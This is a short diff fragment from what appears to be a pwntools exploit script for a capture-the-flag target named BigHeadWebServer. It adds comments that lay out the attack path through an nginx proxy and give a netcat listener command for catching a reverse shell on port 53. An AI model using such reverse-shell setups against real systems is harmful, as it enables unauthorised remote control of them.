@@ -3,6 +3,10 @@
 # http://docs.pwntools.com/en/stable/
 # schex / dualfade
 
+# Attack Flow --
+# Attacker -> LB:80 (nginx proxy)-> BigHeadWebServer:8008 PE 32bit (Custom EXE app)
+# nc -4 -lnvp 53 <- BigHeadWebServer (reverse shell) 
+
 from pwn import *
 import zlib
 
